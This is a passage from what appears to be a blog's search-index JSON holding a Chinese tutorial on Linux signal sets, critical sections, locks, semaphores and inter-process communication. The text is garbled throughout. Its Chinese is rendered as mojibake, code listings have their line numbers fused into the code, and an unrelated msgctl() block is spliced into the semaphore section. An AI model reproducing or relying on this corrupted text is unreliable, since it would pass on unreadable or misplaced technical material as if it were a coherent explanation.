å…¥åˆ°ä¿¡å·é›†ä¸­ sigdelset(): å°†æŒ‡å®šä¿¡å·ä»ä¿¡å·é›†ä¸­åˆ é™¤ sigismember(): æŸ¥è¯¢æŒ‡å®šä¿¡å·æ˜¯å¦åœ¨ä¿¡å·é›†ä¸­ æ³¨å†Œä¿¡å·å¤„ç†å‡½æ•°ä¸»è¦ç”¨äºå†³å®šè¿›ç¨‹å¦‚ä½•å¤„ç†ä¿¡å·ã€‚è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œä¿¡å·é›†é‡Œçš„ä¿¡å·å¹¶ä¸æ˜¯çœŸæ­£å¯ä»¥å¤„ç†çš„ä¿¡å·ï¼Œåªæœ‰å½“ä¿¡å·çš„çŠ¶æ€å¤„äºéé˜»å¡çŠ¶æ€æ—¶æ‰ä¼šçœŸæ­£èµ·ä½œç”¨ã€‚å› æ­¤ï¼Œé¦–å…ˆä½¿ç”¨ sigprocmask() å‡½æ•°æ£€æµ‹å¹¶æ›´æ”¹ä¿¡å·å±è”½å­—ï¼ˆä¿¡å·å±è”½å­—æ˜¯ç”¨æ¥æŒ‡å®šå½“å‰è¢«é˜»å¡çš„ä¸€ç»„ä¿¡å·ï¼Œå®ƒä»¬ä¸ä¼šè¢«è¿›ç¨‹æ¥æ”¶ï¼‰ï¼Œç„¶åä½¿ç”¨ sigaction() å‡½æ•°æ¥å®šä¹‰è¿›ç¨‹æ¥æ”¶åˆ°ç‰¹å®šä¿¡å·åçš„è¡Œä¸ºã€‚ æ£€æµ‹ä¿¡å·æ˜¯ä¿¡å·å¤„ç†çš„åç»­æ­¥éª¤ï¼Œå› ä¸ºè¢«é˜»å¡çš„ä¿¡å·ä¸ä¼šä¼ é€’ç»™è¿›ç¨‹ï¼Œæ‰€ä»¥è¿™äº›ä¿¡å·å°±å¤„äºâ€œæœªå¤„ç†â€çŠ¶æ€ï¼ˆä¹Ÿå°±æ˜¯è¿›ç¨‹ä¸æ¸…é™¤å®ƒçš„å­˜åœ¨ï¼‰ã€‚sigaction() å‡½æ•°å…è®¸è¿›ç¨‹æ£€æµ‹â€œæœªå¤„ç†â€ä¿¡å·ï¼Œå¹¶è¿›ä¸€æ­¥å†³å®šå¯¹å®ƒä»¬åšä½•å¤„ç†ã€‚ å…·ä½“æè¿°å¦‚ä¸‹ï¼š 1234567891011121314#include &lt;signal.h&gt;int sigemptyset(sigset_t *set);int sigfillset(sigset_t *set);int sigaddset(sigset_t *set, int signum);int sigdelset(sigset_t *set, int signum);int sigismember(sigset_t *set, int signum);/*å‚æ•°ï¼š setï¼šä¿¡å·é›† signumï¼šä¿¡å·ä»£ç è¿”å›å€¼ï¼š æˆåŠŸï¼š0 å¤±è´¥ï¼š-1*/ åœ¨ sigprocmask() ä¸­ï¼Œè‹¥ set æ˜¯ä¸€ä¸ªéç©ºæŒ‡é’ˆï¼Œåˆ™å‚æ•° how è¡¨ç¤ºå‡½æ•°çš„æ“ä½œæ–¹å¼ï¼›è‹¥ how ä¸ºç©ºï¼Œåˆ™è¡¨ç¤ºå¿½ç•¥æ­¤æ“ä½œã€‚ 1234567891011121314151617181920212223#include &lt;signal.h&gt;int sigprocmask(int how, const sigset_t *set, sigset_t *oset);/*å‚æ•°ï¼š howï¼š SIG_BLOCK å¢åŠ ä¸€ä¸ªä¿¡å·é›†åˆ°å½“å‰è¿›ç¨‹çš„é˜»å¡é›†ä¸­ SIG_UNBLOCK ä»å½“å‰çš„é˜»å¡é›†ä¸­åˆ é™¤ä¸€ä¸ªä¿¡å·é›† SIG_SETMASK å°†å½“å‰çš„ä¿¡å·é›†è®¾ç½®ä¸ºä¿¡å·é˜»å¡é›† setï¼šæŒ‡å®šä¿¡å·é›† osetï¼šä¿¡å·å±è”½å­—è¿”å›å€¼ï¼š æˆåŠŸï¼š0 å¤±è´¥ï¼š-1*/#include &lt;signal.h&gt;int sigpending(sigset_t *set);/*å‚æ•°ï¼š setï¼šè¦æ£€æµ‹çš„ä¿¡å·é›†è¿”å›å€¼ï¼š æˆåŠŸï¼š0 å¤±è´¥ï¼š-1*/ å¤„ç†ä¿¡å·æ€»æ˜¯éµå¾ªä¸‹å›¾æ‰€ç¤ºçš„è¿‡ç¨‹ï¼š","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€åŸç†å‰–æã€‘3-æ“ä½œç³»ç»Ÿè¿›ç¨‹æ§åˆ¶åŠè¿›ç¨‹é—´é€šä¿¡æ¦‚è¿°","date":"2023-12-25T16:00:00.000Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘3-æ“ä½œç³»ç»Ÿè¿›ç¨‹æ§åˆ¶åŠè¿›ç¨‹é—´é€šä¿¡æ¦‚è¿°/","text":"æ¦‚è¿°ï¼šçŸ¥è¯†ç‚¹ Linux ä¸´ç•Œèµ„æºæ¦‚è¿° Linux è¿›ç¨‹åŒæ­¥ä¸äº’æ–¥ Linux è¿›ç¨‹é—´é€šä¿¡æ¦‚è¿° Linux è¿›ç¨‹é—´é€šä¿¡ä¹‹ç®¡é“æ–¹å¼ 0x01 ä¸´ç•Œèµ„æº ä¸¤ä¸ªä»¥ä¸Šçš„è¿›ç¨‹ä¸èƒ½åŒæ—¶ä½¿ç”¨çš„èµ„æºç§°ä¸ºä¸´ç•Œèµ„æºã€‚ä¸´ç•Œèµ„æºå¯èƒ½æ˜¯ä¸€äº›ç‹¬å è®¾å¤‡ï¼Œä¾‹å¦‚ï¼šæ‰“å°æœºã€æ’­æ”¾å™¨ã€æ‘„åƒå¤´ç­‰ç­‰ç¡¬ä»¶è®¾å¤‡ï¼›ä¹Ÿå¯èƒ½æ˜¯ä¸€å—å…±äº«å†…å­˜ã€è¡¨æ ¼æ–‡ä»¶ã€é“¾è¡¨ç­‰è½¯ä»¶èµ„æºã€‚ ä¸¾ä¾‹è¯´æ˜ï¼šå‡è®¾æœ‰ä¸€ä¸ªç«è½¦è®¢ç¥¨ç³»ç»Ÿæœ‰ä¸¤ä¸ªç»ˆç«¯ç¨‹åºåœ¨è¿è¡Œ T1 å’Œ T2 ï¼Œå¦‚æœä¸å¯¹ä¸´ç•Œèµ„æºè¿›è¡Œç‰¹æ®Šç®¡ç†ï¼Œåˆ™å¾ˆå¯èƒ½å‡ºç° T1 å’Œ T2 åŒæ—¶è·å–åˆ°åŒä¸€å¼ ç¥¨çš„ä¿¡æ¯å–ç»™äº†ä¸åŒçš„ä¹˜å®¢ï¼Œç„¶åè½¦ç¥¨ä½™é‡è¿˜åªå‡å°‘äº†ä¸€å¼ ã€‚å‡ºç°è¿™æ ·çš„æƒ…å†µå°±æ˜¯å› ä¸º T1 å’Œ T2 åœ¨è®¿é—®è®¢ç¥¨ç³»ç»Ÿçš„ä¸´ç•Œèµ„æºæ—¶æ²¡ç”¨è¿›è¡Œé™åˆ¶ä½¿ç”¨å¯¼è‡´çš„ã€‚ 0x02 ä¸´ç•ŒåŒº ä¸è®ºæ˜¯ç¡¬ä»¶èµ„æºè¿˜æ˜¯è½¯ä»¶èµ„æºï¼Œå¤šä¸ªè¿›ç¨‹å¿…é¡»äº’æ–¥è®¿é—®è€Œä¸èƒ½åŒæ—¶è®¿é—®ï¼Œä¸€æ—¦åŒæ—¶è®¿é—®å°±ä¼šå‡ºç°é—®é¢˜ã€‚æ¯ä¸ªè¿›ç¨‹ä¸­è®¿é—®ä¸´ç•Œèµ„æºçš„é‚£æ®µä»£ç ç§°ä¸ºä¸´ç•ŒåŒºã€‚æ‰€ä»¥ï¼Œå¦‚æœèƒ½å¤Ÿä¿è¯å„ä¸ªè¿›ç¨‹åœ¨è¿›å…¥å„è‡ªä¸´ç•ŒåŒºæ˜¯äº’æ–¥çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°å„ä¸ªè¿›ç¨‹å¯¹ä¸´ç•Œèµ„æºçš„è®¿é—®æ˜¯äº’æ–¥çš„ã€‚å› æ­¤ï¼Œæ¯ä¸ªè¿›ç¨‹åœ¨è¿›å…¥ä¸´ç•ŒåŒºä¹‹å‰ï¼Œåº”è¯¥å…ˆå¯¹æ¬²è®¿é—®çš„ä¸´ç•Œèµ„æºè¿›è¡Œæ£€æŸ¥ï¼Œæ£€æŸ¥å½“å‰ä¸´ç•Œèµ„æºæ˜¯å¦æœ‰è¿›ç¨‹åœ¨è¿›è¡Œè®¿é—®ï¼Œå¦‚æœå½“å‰å­˜åœ¨è¿›ç¨‹è®¿é—®ï¼ˆå³å ç”¨ä¸´ç•Œèµ„æºï¼‰ï¼Œåˆ™å½“å‰è¯¥è¿›ç¨‹ä¸èƒ½è¿›å…¥ä¸´ç•ŒåŒºï¼›å¦‚æœæ­¤åˆ»æ²¡æœ‰å…¶ä»–è¿›ç¨‹æ­£åœ¨è®¿é—®å’Œä½¿ç”¨ä¸´ç•Œèµ„æºï¼Œåˆ™å½“å‰è¿›ç¨‹å¯ä»¥è¿›å…¥ä¸´ç•ŒåŒºå¯¹ä¸´ç•Œèµ„æºè¿›è¡Œè®¿é—®å’Œä½¿ç”¨ï¼Œå¹¶è®¾ç½®æ­£åœ¨è®¿é—®æ ‡è¯†æ¥å‘Šè¯‰å…¶ä»–è¿›ç¨‹æ­¤æ—¶ä¸´ç•Œèµ„æºæ­£åœ¨è¢«ä½¿ç”¨ã€‚ï¼ˆè¿™æ ·çš„æ“ä½œå°±ç±»ä¼¼ç«è½¦ä¸Šçš„ç”·å¥³å…±ç”¨çš„å•ç‹¬å«ç”Ÿé—´ï¼Œå½“æœ‰äººåœ¨ä½¿ç”¨æ—¶ï¼Œçº¢ç¯äº®èµ·å‘Šè¯‰æ‰€æœ‰äººæ­£åœ¨ä½¿ç”¨ï¼Œå½“æ— äººä½¿ç”¨æ—¶ç»¿ç¯äº®èµ·ï¼Œè¡¨ç¤ºå½“å‰æ‰€æœ‰äººéƒ½å¯ä»¥è¿›å…¥ï¼‰ è¿›ç¨‹åœ¨è¿›å…¥ä¸´ç•ŒåŒºå‰éœ€è¦æ£€æŸ¥ä¸´ç•Œèµ„æºä½¿ç”¨æƒ…å†µï¼Œèƒ½å¤Ÿè®¿é—®ä¸´ç•Œèµ„æºåéœ€è¦è®¾ç½®æ­£åœ¨è®¿é—®æ ‡è¯†ã€‚åœ¨ç»å¸¸è®¿é—®èµ„æºå®Œæˆåé€€å‡ºä¸´ç•Œèµ„æºçš„è®¿é—®åï¼Œéœ€è¦å°†è®¿é—®æ ‡è¯†æ¢å¤åŸæ ·ï¼Œè¿™éƒ¨åˆ†çš„ä»£ç ç§°ä¸ºé€€å‡ºåŒºã€‚è¿›ç¨‹ä¸­é™¤äº†è¿›å…¥åŒºã€é€€å‡ºåŒºã€ä¸´ç•ŒåŒºï¼Œå…¶ä½™éƒ¨åˆ†çš„ä»£ç ç§°ä¸ºå‰©ä½™åŒºï¼Œäºæ˜¯ä¸€ä¸ªè®¿é—®ä¸´ç•Œèµ„æºçš„è¿›ç¨‹å¯ä»¥è¢«å°ä¸ºå¦‚ä¸‹éƒ¨åˆ†ç»„æˆï¼š 1234è¿›å…¥åŒºä¸´ç•ŒåŒºé€€å‡ºåŒºå‰©ä½™åŒº 0x03 è¿›ç¨‹çš„äº’æ–¥ä¸åŒæ­¥ è¿›ç¨‹äº’æ–¥ è¿›ç¨‹äº’æ–¥æ˜¯æŒ‡å¤šä¸ªè¿›ç¨‹ä¸èƒ½åŒæ—¶ä½¿ç”¨åŒä¸€ä¸ªä¸´ç•Œèµ„æºï¼Œå³ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šè¿›ç¨‹å¿…é¡»äº’æ–¥åœ°ä½¿ç”¨ä¸´ç•Œèµ„æºæˆ–è€…ä¸èƒ½åŒæ—¶è¿›å…¥ä¸´ç•ŒåŒºã€‚è¿™æ˜¯ç”±äºå„ä¸ªè¿›ç¨‹å…±äº«æŸäº›èµ„æºå¼•èµ·çš„ã€‚ è¿›ç¨‹åŒæ­¥ è¿›ç¨‹åŒæ­¥æ˜¯æŒ‡æœ‰åä½œå…³ç³»çš„è¿›ç¨‹ä¹‹é—´ä¸æ–­åœ°è°ƒæ•´å®ƒä»¬ä¹‹é—´çš„ç›¸å¯¹æ‰§è¡Œè¿‡ç¨‹ï¼Œä»¥ä¿è¯ä¸´ç•Œèµ„æºåœ¨ä¸åŒè¿›ç¨‹ä¸­æ‰§è¡Œçš„é¡ºåºå’Œåˆç†åˆ©ç”¨ã€‚ 0x04 Linuxå®ç°è¿›ç¨‹äº’æ–¥å’ŒåŒæ­¥æœºåˆ¶ Linux æ“ä½œç³»ç»Ÿä¸‹å¯¹äºè¿›ç¨‹çš„äº’æ–¥å’ŒåŒæ­¥æ§åˆ¶ä¸»è¦æœ‰ä»¥ä¸‹è¿™ä¸‰ç§æ–¹å¼ï¼š é”æœºåˆ¶ ä¿¡å·é‡æœºåˆ¶ xxxxxxxxxx16 1#include &lt;sys/types.h&gt;2#include &lt;sys/ipc.h&gt;3#include &lt;sys/msg.h&gt;4â€‹5int msgctl(int msgqid, int cmd, struct msgid_ds *buf)6/7å‚æ•°ï¼š8- msqid æ¶ˆæ¯é˜Ÿåˆ—çš„é˜Ÿåˆ— ID9- cmd æ‰§è¡Œæ“ä½œï¼Œå¦‚ä¸‹ï¼š10 - IPC_STATï¼šè¯»å–æ¶ˆæ¯é˜Ÿåˆ—çš„æ•°æ®ç»“æ„ msgid_ds ï¼Œå¹¶å°†å…¶å­˜å‚¨åˆ° buf ä½ç½®11 - IPD_SETï¼šè®¾ç½®æ¶ˆæ¯é˜Ÿåˆ—çš„æ•°æ®ç»“æ„ msgid_ds ä¸­çš„ ipc_perm å€¼ï¼Œè¿™ä¸ªå€¼å–è‡ª buf å‚æ•°12 - IPC_RMIDï¼šä»ç³»ç»Ÿå†…æ ¸ä¸­åˆ é™¤æ¶ˆæ¯é˜Ÿåˆ—13- bufï¼šæè¿°æ¶ˆæ¯é˜Ÿåˆ—çš„ msqid_ds ç»“æ„ç±»å‹çš„å˜é‡14è¿”å›å€¼15 æˆåŠŸè¿”å› 0ï¼Œ å¤±è´¥è¿”å› -116/C 0x05 é”æœºåˆ¶ Linux é”æœºåˆ¶å…¶å®å°±æ˜¯ä¸€ç§å®ç°äº’æ–¥çš„è½¯ä»¶æ–¹å¼ï¼Œå³æä¾›ä¸€å¯¹è¿›ç¨‹å…±äº«çš„é”å˜é‡ï¼Œåœ¨è¿›å…¥ä¸´ç•ŒåŒºä¹‹å‰é¦–å…ˆæµ‹è¯•é”å˜é‡çš„çŠ¶æ€ï¼Œé€šè¿‡é”çš„çŠ¶æ€äº†è§£åˆ°ä¸´ç•Œèµ„æºæ˜¯å¦è¢«å ç”¨ã€‚ä¸´ç•Œèµ„æºå¯ç”¨ï¼Œåˆ™è®¾ç½®é”å˜é‡ï¼›ä¸´ç•Œèµ„æºè¢«å ç”¨ï¼Œåˆ™ä¼šæ ¹æ®é”çš„ä¸åŒé€‰æ‹©ç¡çœ ç­‰å¾…ã€è‡ªæ—‹ç­‰å¾…æˆ–è€…è¿”å›èµ„æºå ç”¨çŠ¶æ€ç­‰ã€‚ä¸»è¦æ“ä½œæµç¨‹æ¼”ç¤ºå¦‚ä¸‹ï¼š 1234567#åŠ é”Lock w:&#123; è®¿é—®ä¸´ç•Œèµ„æº&#125;#è®¿é—®å®Œæ¯•ï¼Œå¼€é”UnLock w; 0x06 ä¿¡å·é‡æœºåˆ¶ åœ¨æ—©å…ˆæå‡ºçš„ä¸€ç§å¹¿ä¹‰é”æœºåˆ¶æˆ–ç§°ä¸ºè®¡æ•°é”çš„åŒæ­¥æœºåˆ¶ï¼Œæ—¢èƒ½è§£å†³äº’æ–¥åˆèƒ½è§£å†³åŒæ­¥ï¼Œæ˜¯ä¸€ç§éå¸¸æœ‰æ•ˆçš„åŒæ­¥å·¥å…·ï¼Œåæ¥åŠ ä»¥æ”¹è¿›å½¢æˆäº†ä¿¡å·é‡åŒæ­¥æœºåˆ¶ã€‚ ç”³è¯·å’Œé‡Šæ”¾ä¸´ç•Œèµ„æºçš„æ–¹å¼é€šè¿‡ wait() æ“ä½œå’Œ signal() æ“ä½œå®Œæˆï¼Œæœ‰æ—¶å€™ä¹Ÿç§°ä¸º P æ“ä½œï¼ˆè·å…°è¯­ Passeren é¦–å­—æ¯ï¼‰å’Œ V æ“ä½œï¼ˆVerhoong çš„é¦–å­—æ¯ï¼‰ã€‚ ä¿¡å·é‡ä¹Ÿè¢«å«åšä¿¡å·ç¯ï¼Œæ˜¯åœ¨ä¿¡å·é‡åŒæ­¥æœºåˆ¶ä¸­ç”¨äºå®ç°è¿›ç¨‹çš„åŒæ­¥å’Œäº’æ–¥çš„æœ‰æ•ˆæ•°æ®ç»“æ„ã€‚æˆ‘ä»¬å¯ä»¥ä¸ºæ¯ä¸€ç±»èµ„æºè®¾ç½®ä¸€ä¸ªä¿¡å·é‡ï¼Œä¿¡å·é‡æœ‰å¾ˆå¤šç§ç±»å‹çš„æ•°æ®ç»“æ„ï¼Œå¦‚æ•´å‹ä¿¡å·é‡ã€è®°å½•å‹ä¿¡å·é‡ã€AND å‹ä¿¡å·é‡ä»¥åŠä¿¡å·é‡é›†ç­‰ã€‚ æ•´å‹ä¿¡å·é‡ æ•´å‹ä¿¡å·é‡æ˜¯ä¿¡å·é‡ä¸­æœ€ç®€å•çš„ç±»å‹ï¼Œä¹Ÿæ˜¯å„ç§ä¿¡å·é‡ç±»å‹ä¸­å¿…é¡»åŒ…å«çš„ç±»å‹ã€‚æ•´å‹ä¿¡å·é‡çš„æ•°å€¼è¡¨ç¤ºå½“å‰ç³»ç»Ÿä¸­å¯ç”¨çš„è¯¥ç±»ä¸´ç•Œèµ„æºçš„æ•°é‡ã€‚ å¦‚è®¾ç½®äº†æ•´å‹ä¿¡å·é‡ s ï¼Œåˆ™ s å€¼çš„æ„ä¹‰ä¸ºï¼š s&gt;0 ï¼Œè¡¨ç¤ºç³»ç»Ÿä¸­ç©ºé—²çš„è¯¥ç±»ä¸´ç•Œèµ„æºçš„ä¸ªæ•°ï¼› s=0 ï¼Œè¡¨ç¤ºç³»ç»Ÿä¸­è¯¥ç±»ä¸´ç•Œèµ„æºå¹²å¥½å…¨éƒ¨è¢«å ç”¨ï¼Œè€Œä¸”æ²¡æœ‰è¿›ç¨‹åœ¨ç­‰å¾…ä¸´ç•Œèµ„æºï¼› s&lt;0 ï¼Œs çš„ç»å¯¹å€¼è¡¨ç¤ºå½“å‰ç³»ç»Ÿä¸­ç­‰å¾…è¯¥ä¸´ç•Œèµ„æºçš„è¿›ç¨‹ä¸ªæ•°ï¼› wait(S) å’Œ Signal(S) å¯ä»¥ç®€å•è¢«æè¿°æˆå¦‚ä¸‹çš„ä»£ç æ‰§è¡Œæ–¹å¼ï¼š 12345678910//wait(S) while(s &lt;= 0) &#123; //è¿›ç¨‹ç­‰å¾… &#125; s = s - 1;//Signal(S) //å‘é€ä¿¡å· s = s + 1; è®°å½•å‹ä¿¡å·é‡ è®°å½•å‹ä¿¡å·é‡çš„æ•°æ®ç»“æ„ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š 123456struct semaphone&#123; int s;//æ•´å‹ä¿¡å· list *l;//è¿›ç¨‹é“¾è¡¨&#125;;struct semaphone S; åœ¨è¿™ä¸ªç»“æ„ä¸­ï¼Œs çš„å€¼è¡¨ç¤ºç³»ç»Ÿä¸­å¯ç”¨çš„è¯¥ç±»ä¸´ç•Œèµ„æºçš„æ•°é‡ï¼Œè€Œ l ä¸ºè¿›ç¨‹é“¾è¡¨æŒ‡é’ˆï¼ŒæŒ‡å‘ç­‰å¾…è¯¥èµ„æºçš„ PCB é˜Ÿåˆ—ã€‚å…·ä½“çš„æ“ä½œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š åœ¨è®°å½•å‹ä¿¡å·é‡æœºåˆ¶ä¸­ï¼Œs çš„åˆå€¼è¡¨ç¤ºç³»ç»Ÿä¸­è¯¥ç±»èµ„æºçš„å¯ç”¨æ•°ç›®ï¼Œå› è€Œåˆè¢«æˆä¸ºèµ„æºä¿¡å·é‡ï¼Œæ¯æ¬¡å¯¹å®ƒè¿›è¡Œ wait() æ“ä½œï¼Œå³ç”³è¯·è¯¥ç±»ä¸€ä¸ªå•ä½çš„ä¸´ç•Œèµ„æºï¼Œæè¿°ä¸º s=s-1 ï¼Œå½“ s&gt;=0 æ¡ä»¶æ»¡è¶³æ—¶ï¼Œè¡¨ç¤ºåœ¨æ²¡ç”¨åšå‡ä¸€æ“ä½œå‰ s&gt;=1 ï¼Œå› æ­¤æœ¬è¿›ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œï¼›å½“ s&gt;=0 æ¡ä»¶ä¸æ»¡è¶³æ—¶ï¼Œè¡¨ç¤ºæ“ä½œå‰ç³»ç»Ÿå°±æ²¡æœ‰ç©ºé—²çš„è¯¥èµ„æºï¼Œå› æ­¤è¿›ç¨‹åº”è¯¥è°ƒç”¨ block å°†è¯¥è¿›ç¨‹çš„ PCB æ’å…¥ç”±æŒ‡é’ˆ l æŒ‡å‘çš„é˜»å¡é˜Ÿåˆ—ã€‚å› æ­¤ï¼Œè¯¥æœºåˆ¶éµå¾ªäº†â€œè®©æƒç­‰å¾…â€ã€‚ s çš„ç»å¯¹å€¼è¡¨ç¤ºåœ¨è¯¥ä¿¡å·é‡é“¾è¡¨ä¸­å·²é˜»å¡ç­‰å¾…è¿›ç¨‹çš„æ•°ç›®ã€‚å¯¹ä¿¡å·é‡çš„æ¯æ¬¡ signal() æ“ä½œè¡¨ç¤ºæ‰§è¡Œè¿›ç¨‹é‡Šæ”¾ä¸€ä¸ªå•ä½çš„è¯¥ç±»ä¸´ç•Œèµ„æºï¼Œå› æ­¤æ“ä½œ s=s+1 è¡¨ç¤ºèµ„æºæ•°ç›®åŠ ä¸€ã€‚å¦‚æœåŠ ä¸€æ“ä½œåå‘ç° s&lt;=0 æ¡ä»¶ä¾ç„¶æˆç«‹ï¼Œè¿™è¡¨ç¤ºè¯¥ä¿¡å·é“¾è¡¨ä¸­ä»ç„¶æœ‰ç­‰å¾…èµ„æºè¢«é˜»å¡çš„ç»å¸¸ï¼Œæ‰€ä»¥è¿˜éœ€è¦è°ƒç”¨ wakeup å°†ç¬¬ä¸€ä¸ªç­‰å¾…è¿›ç¨‹å”¤é†’ï¼Œå…¶ä½™è¿›ç¨‹ç»§ç»­ç­‰å¾…ï¼›è‹¥ s&lt;=0 ä¸æˆç«‹ï¼Œåˆ™è¡¨ç¤ºç³»ç»Ÿä¸­æ²¡ç”¨ç­‰å¾…è¯¥ç±»èµ„æºçš„è¿›ç¨‹ï¼Œå› æ­¤æœ¬è¿›ç¨‹åªéœ€è¦é‡Šæ”¾å®ƒæ‰€å ç”¨çš„è¯¥ç±»èµ„æºç»§ç»­æ‰§è¡Œå³å¯ã€‚ AND å‹ä¿¡å·é‡ AND åŒæ­¥æœºåˆ¶çš„åŸºæœ¬æ€æƒ³æ˜¯å°†è¿›ç¨‹åœ¨æ•´ä¸ªè¿è¡Œè¿‡ç¨‹ä¸­éœ€è¦çš„æ‰€æœ‰èµ„æºï¼Œä¸€æ¬¡æ€§å…¨éƒ¨åˆ†é…ç»™è¿›ç¨‹ï¼Œå¾…è¿›ç¨‹ä½¿ç”¨å®Œæˆåå†ä¸€èµ·é‡Šæ”¾ï¼Œåªè¦æœ‰ä¸€ä¸ªèµ„æºå°šæœªåˆ†é…ç»™è¿›ç¨‹ï¼Œå…¶ä»–æ‰€æœ‰å¯èƒ½åˆ†é…çš„èµ„æºéƒ½ä¸ä¼šåˆ†é…ç»™å®ƒã€‚å…·ä½“æè¿°å¦‚ä¸‹ï¼š 12345678910111213Swait(S1,S2,...,Sn) if S1&gt;=1 and S2 &gt;=1 ... and Sn &gt;=1 then for i: =1 to n do Si:=Si-1; endfor else [å°†è¯¥è¿›ç¨‹æ”¾å…¥é˜»å¡é˜Ÿåˆ—] endifSsignal(S1,S2,...,Sn) for i:=1 to n do Si = Si + 1; å”¤é†’æ‰€æœ‰ Si ä¸æ»¡è¶³è€Œè¿›å…¥é˜»å¡é˜Ÿåˆ—çš„è¿›ç¨‹ endfor ä¿¡å·é‡é›† å¦‚æœæŸè¿›ç¨‹ä¸€æ¬¡éœ€è¦ N ä¸ªæŸç±»èµ„æºæ—¶ï¼Œå°±éœ€è¦è¿›è¡Œ N æ¬¡ wait() æ“ä½œï¼Œè¿™ä½¿å¾—ç³»ç»Ÿæ•ˆç‡éå¸¸ä½å¹¶ä¸”å¯èƒ½é€ æˆæ­»é”ã€‚ ä¿¡å·é‡é›†æœºåˆ¶çš„åŸºæœ¬æ€æƒ³æ˜¯åœ¨ AND å‹ä¿¡å·é‡é›†çš„åŸºç¡€ä¸Šè¿›è¡Œæ‰©å……ï¼Œè¿›ç¨‹å¯¹ä¿¡å·é‡ Si çš„æµ‹è¯•å€¼ä¸º ti ï¼ˆç”¨äºä¿¡å·é‡åˆ¤æ–­ï¼‰ï¼Œå ç”¨å€¼ä¸º di ï¼ˆç”¨äºä¿¡å·é‡çš„å¢å‡ï¼‰ 12Swait(S1,S2,...,Sn)Ssignal(S1,d1;S2,d2;...;Sn,dn) ä¸€èˆ¬â€œä¿¡å·é‡é›†â€çš„å‡ ç§ç‰¹å®šæƒ…å†µå¦‚ä¸‹ï¼š Swait(S,d,d) è¡¨ç¤ºæ¯æ¬¡ç”³è¯· d ä¸ªèµ„æºï¼Œå½“å°‘äº d æ—¶ä¸è¿›è¡Œåˆ†é… Swait(S,1,1) è¡¨ç¤ºäº’æ–¥ä¿¡å·é‡ Swait(S,1,0) ä½œä¸ºä¸€ä¸ªå¯æ§å¼€å…³ï¼ˆå½“ S&gt;=1 æ—¶å…è®¸å¤šä¸ªè¿›ç¨‹è¿›å…¥ä¸´ç•ŒåŒºï¼›å½“ S==0 æ—¶ç¦æ­¢ä»»ä½•è¿›ç¨‹è¿›å…¥ä¸´ç•ŒåŒºï¼‰ â€œä¿¡å·é‡é›†â€æœªå¿…æˆå¯¹ä½¿ç”¨ Swait() å’Œ Ssignal()ï¼Œå¦‚ä¸€èµ·ç”³è¯·ï¼Œä½†å¯ä»¥ä¸ä¸€èµ·é‡Šæ”¾ 0x07 è¿›ç¨‹é—´é€šä¿¡ æˆ‘ä»¬åº”è¯¥éƒ½çŸ¥é“äº†ï¼Œè¿›ç¨‹æ˜¯ä¸€ä¸ªç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œï¼Œæ˜¯ç³»ç»Ÿèµ„æºåˆ†é…çš„æœ€å°å•å…ƒã€‚è¿™é‡Œæ‰€è¯´çš„è¿›ç¨‹ä¸€èˆ¬æ˜¯æŒ‡è¿è¡Œåœ¨ç”¨æˆ·æ€çš„è¿›ç¨‹ï¼Œè€Œç”±äºå¤„äºç”¨æˆ·æ€çš„ä¸åŒè¿›ç¨‹é—´æ˜¯å½¼æ­¤éš”ç¦»çš„ï¼Œä½†æ˜¯å®ƒä»¬å¾ˆå¯èƒ½éœ€è¦ç›¸äº’å‘é€ä¸€äº›ä¿¡æ¯ï¼Œå¥½è®©å¯¹æ–¹çŸ¥é“è‡ªå·±çš„è¿›åº¦ç­‰æƒ…å†µï¼Œåƒè¿™æ ·è¿›ç¨‹é—´ä¼ é€’ä¿¡æ¯å°±å«è¿›ç¨‹é—´é€šä¿¡ã€‚ Linux è¿›ç¨‹é—´é€šä¿¡çš„æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§ï¼ˆè¿™æ˜¯å›ºå®šçš„ï¼‰ï¼š ç®¡é“(Pipe)åŠæœ‰åç®¡é“(Named Pipe): ç®¡é“å¯ç”¨äºå…·æœ‰&quot;è¡€ç¼˜&quot;å…³ç³»è¿›ç¨‹é—´(ä¹Ÿå°±æ˜¯çˆ¶å­è¿›ç¨‹æˆ–è€…å…„å¼Ÿè¿›ç¨‹)çš„é€šä¿¡ã€‚æœ‰åç®¡é“é™¤å…·æœ‰ç®¡é“æ‰€å…·æœ‰çš„åŠŸèƒ½å¤–ï¼Œè¿˜å…è®¸æ— &quot;è¡€ç¼˜&quot;å…³ç³»è¿›ç¨‹é—´çš„é€šä¿¡ã€‚ ä¿¡å·(Signal): ä¿¡å·æ˜¯åœ¨è½¯ä»¶å±‚æ¬¡ä¸Šå¯¹ä¸­æ–­æœºåˆ¶çš„ä¸€ç§æ¨¡æ‹Ÿï¼Œå®ƒæ˜¯æ¯”è¾ƒå¤æ‚çš„é€šä¿¡æ–¹å¼ï¼Œç”¨äºé€šçŸ¥è¿›ç¨‹æœ‰æŸäº‹ä»¶å‘ç”Ÿã€‚ ä¿¡å·é‡(Semaphore): ä¸»è¦ä½œä¸ºè¿›ç¨‹ä¹‹é—´åŠåŒä¸€è¿›ç¨‹çš„ä¸åŒçº¿ç¨‹ä¹‹é—´çš„åŒæ­¥å’Œäº’æ–¥æ‰‹æ®µã€‚ 